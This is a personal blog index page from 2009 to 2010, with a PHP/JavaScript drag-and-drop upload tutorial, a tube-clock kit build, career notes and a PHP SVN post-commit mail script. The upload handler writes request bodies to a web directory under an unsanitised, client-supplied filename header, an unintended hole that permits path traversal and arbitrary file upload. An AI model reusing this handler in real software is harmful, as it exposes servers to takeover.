
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Thijs Lensselink's Blog</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="description" content="Drag & Drop Uploads With XMLHttpRequest2 and PHP I finally had some time to read through my ever growing list must read items and play with some new &hellip;">
    
    <meta name="author" content="Thijs Lensselink">
    
    <link rel="canonical" href="http://blog.lenss.nl/page/9/">
    <link rel="shortcut icon" href="/favicon.ico">
    <link href="http://feeds.feedburner.com/ThijsLensselinksBlog" rel="alternate" title="Thijs Lensselink's Blog" type="application/atom+xml">

    <link href="/stylesheets/screen.css" rel="stylesheet">
    <link href="/stylesheets/bootstrap.min.css" rel="stylesheet">
    <link href="/stylesheets/bootstrap-theme.min.css" rel="stylesheet">
    <link href="/stylesheets/bootstrap-responsive.css" rel="stylesheet">
    <link href="/stylesheets/font-awesome.min.css" rel="stylesheet">
    <link href="/stylesheets/lenss.css" rel="stylesheet">
    
  </head>


<body   >

    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="#"><i class="fa fa-linux"></i> lenss<span class="lenssnl">.nl/blog</span></a>
        </div>
        <div class="collapse navbar-collapse">
          <ul class="nav navbar-nav navbar-right">
            <li><a href="http://lenss.nl" onClick="_gaq.push(['_trackEvent', 'External-Nav Links', 'Click', 'Www']);">Home</a></li>
            <li class="active"><a href="http://blog.lenss.nl/" class="lenssnl" onClick="_gaq.push(['_trackEvent', 'External-Nav Links', 'Click', 'Blog']);">Blog</a></li>
          </ul>
        </div>
      </div>
    </div>

    <div class="container">

      <div class="row">

        <div class="col-sm-8">
	
          <div id="content">
	      <div class="inner">
	      <div class="blog-index">
  
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2010/01/drag-drop-uploads-with-xmlhttprequest2-and-php/">Drag & Drop Uploads With XMLHttpRequest2 and PHP</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>I finally had some time to read through my ever growing list must read items and play with some new software. While reading up on the new Firefox 3.6 i noticed it came with the new <a href="http://www.ideal.nl/">XMLHttpRequest</a> [<a href="http://www.w3.org/TR/XMLHttpRequest2/">2</a>] object based on the new <a href="http://dev.w3.org/2006/webapi/FileAPI/">file API</a>. And according to the new <a href="http://dev.w3.org/2006/webapi/FileAPI/">specs</a>. This would allow for easy file uploads. Now there’s been some <a href="http://hacks.mozilla.org/2009/12/uploading-files-with-xmlhttprequest/">examples</a> [<a href="http://arstechnica.com/open-source/news/2009/11/w3c-publishes-draft-of-new-file-api-spec.ars">2</a>] on the web already. But i just wanted to get my hands dirty.</p>

<p>The new XMLHttpRequest object makes is possible to send files in a few different formats. The most important being the binary format. The code for sending a request with XMLHttpRequest2 looks the same as the previous version. Except for sendAsBinary() in this case.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();
    
fileUpload = xhr.upload,
fileUpload.<span class="function">onload</span> = <span class="keyword">function</span>() {
  console.log(<span class="string"><span class="delimiter">&quot;</span><span class="content">Sent!</span><span class="delimiter">&quot;</span></span>);
}
                                    
xhr.open(<span class="string"><span class="delimiter">&quot;</span><span class="content">POST</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">upload.php</span><span class="delimiter">&quot;</span></span>, <span class="predefined-constant">true</span>);
xhr.sendAsBinary(file.getAsBinary());
</pre></div>
</div>
 </figure></notextile></div>

<p>So let’s set things up for drag &amp; drop. We need a div that will be the main drop point. And we need some event listeners to catch the drag * drop events. Let start by creating the drop zone. For this we use two simple divs. The outer div will listen for the drag &amp; drop events. And the inner will catch the files.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="tag">&lt;div</span> <span class="attribute-name">id</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">container</span><span class="delimiter">&quot;</span></span><span class="tag">&gt;</span>
  <span class="tag">&lt;div</span> <span class="attribute-name">id</span>=<span class="string"><span class="delimiter">&quot;</span><span class="content">drop</span><span class="delimiter">&quot;</span></span><span class="tag">&gt;</span><span class="tag">&lt;/div&gt;</span>
<span class="tag">&lt;/div&gt;</span>
</pre></div>
</div>
 </figure></notextile></div>

<p>Now let’s create our upload code.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">var</span> upload = {
  <span class="function">setup</span> : <span class="keyword">function</span>() {},
  <span class="function">uploadFiles</span> : <span class="keyword">function</span>() {event}
}
window.addEventListener(<span class="string"><span class="delimiter">&quot;</span><span class="content">load</span><span class="delimiter">&quot;</span></span>, upload.setup, <span class="predefined-constant">false</span>);
</pre></div>
</div>
 </figure></notextile></div>

<p>The setup method will set all event listeners for drag &amp; drop. And register the upload handler.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">var</span> container = document.getElementById(<span class="string"><span class="delimiter">'</span><span class="content">container</span><span class="delimiter">'</span></span>);
<span class="keyword">var</span> drop = document.getElementById(<span class="string"><span class="delimiter">'</span><span class="content">drop</span><span class="delimiter">'</span></span>);
                
container.addEventListener(<span class="string"><span class="delimiter">&quot;</span><span class="content">dragenter</span><span class="delimiter">&quot;</span></span>, <span class="keyword">function</span>(event) {
    drop.innerHTML = <span class="string"><span class="delimiter">'</span><span class="delimiter">'</span></span>;
    event.stopPropagation();
    event.preventDefault();
  }, 
  <span class="predefined-constant">false</span>
);

container.addEventListener(<span class="string"><span class="delimiter">&quot;</span><span class="content">dragover</span><span class="delimiter">&quot;</span></span>, <span class="keyword">function</span>(event) {
    event.stopPropagation(); 
    event.preventDefault();
  }, 
  <span class="predefined-constant">false</span>
);

container.addEventListener(<span class="string"><span class="delimiter">&quot;</span><span class="content">drop</span><span class="delimiter">&quot;</span></span>, upload.uploadFiles, <span class="predefined-constant">false</span>);
</pre></div>
</div>
 </figure></notextile></div>

<p>As you could see above. the uploadFiles() method gets a event returned from the drag &amp; drop action. This is where the new <a href="http://dev.w3.org/2006/webapi/FileAPI/">file APi</a> comes in play. To get to the file property we access the dataTransfer object.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">var</span> files = event.dataTransfer.files;
</pre></div>
</div>
 </figure></notextile></div>

<p>The actual uploading is easy as cake.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="integer">0</span>; x &lt; files.length; x++) {

  <span class="keyword">var</span> file = files.item(x);
  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();

  fileUpload = xhr.upload;
  fileUpload.<span class="function">onload</span> = <span class="keyword">function</span>() {
    console.log(<span class="string"><span class="delimiter">&quot;</span><span class="content">Sent!</span><span class="delimiter">&quot;</span></span>);
  }
                        
  xhr.open(<span class="string"><span class="delimiter">&quot;</span><span class="content">POST</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">upload.php</span><span class="delimiter">&quot;</span></span>, <span class="predefined-constant">true</span>);

  xhr.setRequestHeader(<span class="string"><span class="delimiter">&quot;</span><span class="content">Cache-Control</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">no-cache</span><span class="delimiter">&quot;</span></span>);
  xhr.setRequestHeader(<span class="string"><span class="delimiter">&quot;</span><span class="content">X-Requested-With</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">XMLHttpRequest</span><span class="delimiter">&quot;</span></span>);
  xhr.setRequestHeader(<span class="string"><span class="delimiter">&quot;</span><span class="content">X-File-Name</span><span class="delimiter">&quot;</span></span>, file.fileName);
  xhr.setRequestHeader(<span class="string"><span class="delimiter">&quot;</span><span class="content">X-File-Size</span><span class="delimiter">&quot;</span></span>, file.fileSize);
  xhr.setRequestHeader(<span class="string"><span class="delimiter">&quot;</span><span class="content">Content-Type</span><span class="delimiter">&quot;</span></span>, <span class="string"><span class="delimiter">&quot;</span><span class="content">multipart/form-data</span><span class="delimiter">&quot;</span></span>);
                                
  xhr.sendAsBinary(file.getAsBinary());
}
</pre></div>
</div>
 </figure></notextile></div>

<p>That’s it for the client side. There is however a small problem on the receiving side. When handling uploaded files in PHP we expect the <strong>$_FILES</strong> array to be populated. This is not the case when streaming files from the client to the server. To get the needed file information we set some headers on the client side <strong>X-File-Name</strong> and <strong>X-File-Size</strong>. And since the <strong>$_FILES</strong> are is empty. We need an other way to get the file contents. So we will use php://input streams for that.</p>

<p>The contents of upload.php look like this:</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="predefined">require_once</span>(<span class="string"><span class="delimiter">'</span><span class="content">Streamer.php</span><span class="delimiter">'</span></span>);
    
<span class="local-variable">$ft</span> = <span class="keyword">new</span> <span class="constant">File_Streamer</span>();
<span class="local-variable">$ft</span>-&gt;setDestination(<span class="string"><span class="delimiter">'</span><span class="content">data/</span><span class="delimiter">'</span></span>);
<span class="local-variable">$ft</span>-&gt;receive();
</pre></div>
</div>
 </figure></notextile></div>

<p>With setDestination() the destination path for the uploaded files is set. And recieve() listens for any incoming files. Most of the magic is done in the recieve() method. So here’s the code.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">public</span> <span class="keyword">function</span> <span class="function">receive</span>()
{
  <span class="keyword">if</span> (!<span class="local-variable">$this</span>-&gt;isValid()) {
    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="predefined-constant">Exception</span>(<span class="string"><span class="delimiter">'</span><span class="content">No file uploaded!</span><span class="delimiter">'</span></span>);
  }
        
  <span class="predefined">file_put_contents</span>(
    <span class="local-variable">$this</span>-&gt;_destination . <span class="local-variable">$this</span>-&gt;_fileName, 
    <span class="predefined">file_get_contents</span>(<span class="string"><span class="delimiter">&quot;</span><span class="content">php://input</span><span class="delimiter">&quot;</span></span>)
  );
    
  <span class="keyword">return</span> <span class="predefined-constant">true</span>;
}
</pre></div>
</div>
 </figure></notextile></div>

<p>I am impressed! This promises a lot of good. And offers some interesting options. Let’s hope all browsers implement this gem. I still have one issue though. I can’t get this to work in firefox under linux. The drag &amp; drop events do not seem to function properly with files being dragged from the desktop. anybody know why? </p>

<p>If you interested in the complete code. you can find it <a href="http://lenss.nl/code/dragDropUpload.tar.gz">here</a></p>

<p><strong>**Small update</strong>**
<a href="http://lenss.nl/2010/09/drag-drop-uploads-with-xmlhttprequest2-and-php-revised/">http://lenss.nl/2010/09/drag-drop-uploads-with-xmlhttprequest2-and-php-revised/</a></p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2010/01/drag-drop-uploads-with-xmlhttprequest2-and-php/#disqus_thread">Comments</a>
      
      








  


<time datetime="2010-01-25T01:02:38+01:00" pubdate data-updated="true">Jan 25<span>th</span>, 2010</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/code/'>Code</a>, <a class='category' href='http://blog.lenss.nl/tag/javascript/'>Javascript</a>, <a class='category' href='http://blog.lenss.nl/tag/php/'>PHP</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/12/end-year-notice/">End Year Notice</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>Have been working hard this week on <a href="http://kremermakelaars.nl">kremermakelaars.nl</a>. And managed to finish it right before the end of this year. The old website was one of those left overs from the early 90’s. The only thing missing was a spinning @ sign. But i think i managed to give it a nice visual boost. For the back-end i created s nice CMS to manage all objects and page content. The whole thing is build with ZF, Mysql, and some javascript libraries.</p>

<p>The customer is happy. I’m happy. Now it’s time for some fun!</p>

<p>So that’s all for 2009. I wish everybody a good and happy new year.</p>

</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/12/end-year-notice/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-12-31T11:38:33+01:00" pubdate data-updated="true">Dec 31<span>st</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/-home/'>/home</a>, <a class='category' href='http://blog.lenss.nl/tag/freelance/'>Freelance</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/12/a-new-hobby/">A New Hobby</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>A few months ago i got stranded on <a href="http://www.adafruit.com/">adda’s</a> website. This stuff looks so interesting. But thinking about building my own gives me sweaty hands. I love to build computers from scratch. But building a motherboard… i don’t see me doing that anytime soon. Even though i have null knowledge of the subject. I decided to give it shot anyway. And ordered the Russian Tube Clock. It arrived pretty fast. But occupied some closet space for at least 3 weeks. I however managed to push my self into building this thing. So here goes.</p>

<p>When you unpack the whole thing and lay it out on a table it looks pretty impressive. And at this point i got the feeling i would never get this to work. But thank god for the internet. I quickly found some nice hand held guides to <a href="http://0x.vc/4">guide</a> me through it.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/IMG_0550-1024x768.jpg" /></p>

<p>I will not bother you with all specifics. because i can’t :) And for that you should read <a href="http://www.adafruit.com/index.php?main_page=product_info&amp;cPath=39&amp;products_id=194">here</a> and <a href="http://www.ladyada.net/make/icetube/">here</a> Or just order the kit and give it a shot. it’s great. So after burning my self i managed to get the first set of components mounted properly on top of the PCB.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/IMG_0555-1024x768.jpg" /></p>

<p>The only problem i encountered (and it spoiled most of the project) was the soldering iron. Which was a mess to start of with. And it was way to big for this delicate work. The result was my soldering didn’t look that proper as you can see in the image below.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/IMG_0557-1024x768.jpg" /></p>

<p>The hardest part was to get the tube mounted correctly. One end of the tube is a spring of wires that need to be attached to a jack on the smaller PCB. It’s a time consuming and tedious job to do. But i think i managed. Although not all wires are as straight as they should have been.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/img_0611-1024x768.jpg" /></p>

<p>It finally starts to look like something. After hooking it up to some power and running some tests. I was ready to build the outer casing.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/img_0609-1024x768.jpg" /></p>

<p>The outer casing is a simple design. Done in Plexiglas. It looks simple. But it was a struggle to get the thing assembled.</p>

<p><img src="http://blog.lenss.nl/images/2009/12/IMG_0563-1024x768.jpg" /></p>

<p>After my struggle with the casing i switched the tube on. And was greeted by a nice blue/greenish color and a beep. The color is a bit different from what is shown on the main site. But that has something to do with the tubes i read. The brightness is adjustable so that’s no problem. As you can see i still miss one time delimiter. And the menu is still not function 100%. But the clock works. And i can set the alarm. </p>

<p><img src="http://blog.lenss.nl/images/2009/12/img_0608-1024x768.jpg" /></p>

<p>I had so much fun building this thing. that i ordered a new soldering iron. And will be doing a new attempt soon!</p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/12/a-new-hobby/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-12-20T22:46:10+01:00" pubdate data-updated="true">Dec 20<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/-home/'>/home</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/12/a-new-adventure-part-ii/">A New Adventure Part II</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>This post is a recap of a post i made earlier this month. Normally i would leave it as it is. But i wasn’t really happy with the outcome. And it didn’t really reflect the current situation. So here goes.</p>

<p>As the technological challenge in my current day to day job started to decline. I started to think this was not the right position for me. So i decided it was time to search for something new. And at that time i could not find anything interesting that didn’t include relocating my self to an other part of this world. This left me with a hard choice to make. But i left <a href="http://addmissions.nl/">AddMissions</a> anyway. With a good feeling though. I had have a great year there. Now was just time for a change.</p>

<p>All that was about two months ago. And for the past time i have been doing some <a href="http://bluesignal.nl/">freelance projects</a> to pay my bills. And although i enjoyed the time working from home. I feel it is time again to go and search for a new opportunity. I learned a lot from the past two months but freelance work is not something i tend to do full time. I need people around me. Even though i don’t talk that much while i work :)</p>

<p>I have some things cooking at the moment. Let’s see what the new year has to offer.</p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/12/a-new-adventure-part-ii/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-12-20T22:10:44+01:00" pubdate data-updated="true">Dec 20<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/-home/'>/home</a>, <a class='category' href='http://blog.lenss.nl/tag/freelance/'>Freelance</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/12/0x-vc-url-shortener-service/">0x. Vc URL Shortener Service</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>Having a hard time getting to sleep tonight. And was browsing my domain list. when i realized i still have this very short domain name that is just sitting there collecting dust. And since these URl shortener services are so hot lately i decided to roll my own.</p>

<p>So three hours, a bit of code and a short domain name later i present : 0x.vc (it’s shorter) It’s probably still full of holes and prone to XSS attacks. So be careful!</p>

<p><strong>The URL shortening service is offline!</strong></p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/12/0x-vc-url-shortener-service/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-12-17T04:14:18+01:00" pubdate data-updated="true">Dec 17<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/code/'>Code</a>, <a class='category' href='http://blog.lenss.nl/tag/freelance/'>Freelance</a>, <a class='category' href='http://blog.lenss.nl/tag/javascript/'>Javascript</a>, <a class='category' href='http://blog.lenss.nl/tag/php/'>PHP</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/11/firefoxs-weird-black-borders/">Firefox&#8217;s Weird Black Borders</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>A few weeks a go i was working on a new blog to replace the current Wordpress software. The last two weeks however i had no time to work on it. So last night when i couldn’t sleep i loaded the site from my SVn repo. And when i opened it in firefox i was suprised to see some weird black borders around some page elements. After checking my CSS i confirmed  it was not created by any CSS on the page. </p>

<p><a href="http://blog.lenss.nl/images/2009/11/blackline.jpg"><img src="http://blog.lenss.nl/images/2009/11/blackline-300x292.jpg" alt="blackline" /></a></p>

<p>After an hour i got frustrated and went to bed. So this morning i was looking at it. An noticed a horizontal scrollbar. That shouldn’t be there i thought. And when i looked closy at the images on the page they looked correlated. It was like the page was zoomed in. Then it hit me. Firefox has a new zoom function. So after hitting</p>

<p>View &gt; Zoom &gt; Reset</p>

<p>The page was back to normal. It’s minor issue. But maybe it will help somebody from going crazy :)</p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/11/firefoxs-weird-black-borders/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-11-07T11:11:16+01:00" pubdate data-updated="true">Nov 7<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/code/'>Code</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/09/svns-post-commit-script-in-php/">SVN&#8217;s Post-commit Script in PHP</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>I was kinda bored yesterday. And was poking around the SVN hooks scripts. When i noticed the post-commit script i was using was written in Python. Nothing wrong with that. I just wondered how hard it would be to do the same in PHP. So i came up with a little test. Which at this moment lacks error checking and just looks plain ugly. But it does the job. and i only needed a working PHP CLI executable to make it work.</p>

<p>First we set the email address and the location of svnlook. </p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
#!/usr/bin/php
<span class="inline-delimiter">&lt;?php</span>
<span class="predefined">error_reporting</span>(<span class="exception">E_ALL</span> | <span class="exception">E_STRICT</span>); 
    
<span class="local-variable">$address</span> = <span class="string"><span class="delimiter">'</span><span class="content">some email address</span><span class="delimiter">'</span></span>;
<span class="local-variable">$svnlook</span> = <span class="string"><span class="delimiter">'</span><span class="content">/usr/bin/svnlook</span><span class="delimiter">'</span></span>;
</pre></div>
</div>
 </figure></notextile></div>

<p>Use the argv array to get to the commandline parameters and build up a SVN statement to get some basic info.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$repository</span> = <span class="predefined">$_SERVER</span>[<span class="string"><span class="delimiter">'</span><span class="content">argv</span><span class="delimiter">'</span></span>][<span class="integer">1</span>];
<span class="local-variable">$revision</span> = <span class="predefined">$_SERVER</span>[<span class="string"><span class="delimiter">'</span><span class="content">argv</span><span class="delimiter">'</span></span>][<span class="integer">2</span>];

<span class="local-variable">$cmdInfo</span> = <span class="string"><span class="delimiter">&quot;</span><span class="local-variable">${svnlook}</span><span class="content"> info </span><span class="local-variable">${repository}</span><span class="content"> -r </span><span class="local-variable">${revision}</span><span class="delimiter">&quot;</span></span>;

<span class="local-variable">$output</span> = <span class="predefined">array</span>();
<span class="predefined">exec</span>(<span class="local-variable">$cmdInfo</span>, <span class="local-variable">$output</span>);

<span class="local-variable">$author</span> = <span class="local-variable">$output</span>[<span class="integer">0</span>];
<span class="local-variable">$date</span> = <span class="local-variable">$output</span>[<span class="integer">1</span>];
<span class="local-variable">$comment</span> = <span class="local-variable">$output</span>[<span class="integer">3</span>];
</pre></div>
</div>
 </figure></notextile></div>

<p>Now let’s get the changes made in this revisions.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$output</span> = <span class="predefined">array</span>();
<span class="local-variable">$cmdChanges</span> =<span class="string"><span class="delimiter">&quot;</span><span class="local-variable">${svnlook}</span><span class="content"> diff </span><span class="local-variable">${repository}</span><span class="content"> -r </span><span class="local-variable">${revision}</span><span class="delimiter">&quot;</span></span>;
<span class="predefined">exec</span>(<span class="local-variable">$cmdChanges</span>, <span class="local-variable">$output</span>);
</pre></div>
</div>
 </figure></notextile></div>

<p>Once we have the diff contents we can loop through the lines and use some simple regex to highlight the changes. I’ve added a bit more code to add pre tags for a better visual effect.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$patch</span> = <span class="string"><span class="delimiter">'</span><span class="content">&lt;pre class=&quot;codeBlock&quot;&gt;</span><span class="delimiter">'</span></span>;
<span class="local-variable">$lineCount</span> = <span class="predefined">count</span>(<span class="local-variable">$output</span>);
<span class="keyword">for</span> (<span class="local-variable">$x</span>=<span class="integer">0</span>; <span class="local-variable">$x</span>&lt;=<span class="local-variable">$lineCount</span>; <span class="local-variable">$x</span>++) {

  <span class="keyword">if</span> (<span class="local-variable">$x</span> &gt; <span class="integer">0</span> &amp;&amp; <span class="predefined">strstr</span>(<span class="local-variable">$output</span>[<span class="local-variable">$x</span>], <span class="string"><span class="delimiter">'</span><span class="content">Modified:</span><span class="delimiter">'</span></span>)) {
    <span class="local-variable">$patch</span> .= <span class="string"><span class="delimiter">'</span><span class="content">&lt;/pre&gt;&lt;pre class=&quot;codeBlock&quot;&gt;</span><span class="delimiter">'</span></span>;
  }

  <span class="local-variable">$textColor</span> = <span class="string"><span class="delimiter">'</span><span class="content">normal</span><span class="delimiter">'</span></span>;
  <span class="keyword">if</span> (<span class="predefined">preg_match</span>(<span class="string"><span class="delimiter">'</span><span class="content">/^</span><span class="content">\+</span><span class="content">/</span><span class="delimiter">'</span></span>, <span class="local-variable">$output</span>[<span class="local-variable">$x</span>])) {
    <span class="local-variable">$textColor</span> = <span class="string"><span class="delimiter">'</span><span class="content">positive</span><span class="delimiter">'</span></span>;
  }
  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="predefined">preg_match</span>(<span class="string"><span class="delimiter">'</span><span class="content">/^-/</span><span class="delimiter">'</span></span>, <span class="local-variable">$output</span>[<span class="local-variable">$x</span>])) {
    <span class="local-variable">$textColor</span> = <span class="string"><span class="delimiter">'</span><span class="content">negative</span><span class="delimiter">'</span></span>;
  }

  <span class="local-variable">$patch</span> .= <span class="string"><span class="delimiter">'</span><span class="content">&lt;span class=&quot;</span><span class="delimiter">'</span></span> . <span class="local-variable">$textColor</span> . <span class="string"><span class="delimiter">'</span><span class="content">&quot;&gt;</span><span class="delimiter">'</span></span> . <span class="predefined">htmlentities</span>(<span class="local-variable">$output</span>[<span class="local-variable">$x</span>]) . <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;/span&gt;&lt;br&gt;</span><span class="delimiter">&quot;</span></span>;

  <span class="keyword">if</span> (<span class="local-variable">$x</span> == <span class="local-variable">$lineCount</span>) {
    <span class="local-variable">$patch</span> .= <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;/pre&gt;</span><span class="delimiter">&quot;</span></span>;
  }
}
</pre></div>
</div>
 </figure></notextile></div>

<p>Now we can build the body for the email that will be generated.</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$body</span> .= <span class="string"><span class="delimiter">&quot;</span><span class="content">Author : </span><span class="delimiter">&quot;</span></span> . <span class="local-variable">$author</span> . <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;br&gt;</span><span class="delimiter">&quot;</span></span>;
<span class="local-variable">$body</span> .= <span class="string"><span class="delimiter">&quot;</span><span class="content">Date : </span><span class="delimiter">&quot;</span></span> . <span class="local-variable">$date</span> . <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;br&gt;</span><span class="delimiter">&quot;</span></span>;
<span class="local-variable">$body</span> .= <span class="string"><span class="delimiter">&quot;</span><span class="content">Comment : </span><span class="delimiter">&quot;</span></span> . <span class="local-variable">$comment</span> . <span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;br&gt;&lt;br&gt;</span><span class="delimiter">&quot;</span></span>;

<span class="local-variable">$body</span> .= <span class="local-variable">$patch</span>;
</pre></div>
</div>
 </figure></notextile></div>

<p>Add a MIME header so my mail client displays it properly. And send it of through the build in mail() function. </p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="local-variable">$headers</span>  = <span class="string"><span class="delimiter">'</span><span class="content">MIME-Version: 1.0</span><span class="delimiter">'</span></span> . <span class="string"><span class="delimiter">&quot;</span><span class="char">\r</span><span class="char">\n</span><span class="delimiter">&quot;</span></span>;
<span class="local-variable">$headers</span> .= <span class="string"><span class="delimiter">'</span><span class="content">Content-type: text/html; charset=iso-8859-1</span><span class="delimiter">'</span></span> . <span class="string"><span class="delimiter">&quot;</span><span class="char">\r</span><span class="char">\n</span><span class="delimiter">&quot;</span></span>;

<span class="local-variable">$bodyHTML</span> = <span class="predefined">file_get_contents</span>(<span class="string"><span class="delimiter">&quot;</span><span class="content">/path/to/some/HTML/template</span><span class="delimiter">&quot;</span></span>);
<span class="local-variable">$bodyHTML</span> = <span class="predefined">str_replace</span>(<span class="string"><span class="delimiter">'</span><span class="content">{EMAIL}</span><span class="delimiter">'</span></span>, <span class="local-variable">$body</span>, <span class="local-variable">$bodyHTML</span>);

<span class="predefined">mail</span>(<span class="local-variable">$address</span>, <span class="string"><span class="delimiter">'</span><span class="content">SVN post-commit</span><span class="delimiter">'</span></span>, <span class="local-variable">$bodyHTML</span>, <span class="local-variable">$headers</span>);
</pre></div>
</div>
 </figure></notextile></div>

</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/09/svns-post-commit-script-in-php/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-09-14T11:07:42+02:00" pubdate data-updated="true">Sep 14<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/php/'>PHP</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/07/mayflowers-zend-framework-poster/">Mayflower&#8217;s Zend Framework Poster</a></h1>
	
	</header>
</header>


